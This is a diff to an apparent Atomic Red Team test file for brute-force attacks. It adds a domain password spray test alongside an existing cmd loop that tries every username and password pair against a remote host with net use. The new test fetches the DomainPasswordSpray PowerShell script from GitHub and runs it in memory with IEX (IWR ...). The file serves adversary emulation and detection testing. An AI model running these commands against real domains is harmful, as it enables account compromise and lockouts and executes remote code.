@@ -35,3 +35,27 @@ atomic_tests:
       echo "1q2w3e4r" >> #{input_file_passwords}
       echo "Password!" >> #{input_file_passwords}
       @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+
+- name: Password Spray (DomainPasswordSpray)
+  description: |
+    Perform a domain password spray using the DomainPasswordSpray tool. By default, the password list only has one password. This is to
+    prevent account lockouts. Replace it with a list that has more passwords if you're sure it won't cause damage. The script will wait for the AD account lockout
+    period before trying each password, so a long password list could take hours to days.
+    
+    https://github.com/dafthack/DomainPasswordSpray
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    passwords_file:
+      description: Path to a file containing a list of passwords we will attempt to brute force with
+      type: Path
+      default: PathToAtomicsFolder\T1110\src\passwords.txt
+    
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -PasswordList #{passwords_file} -Force
+
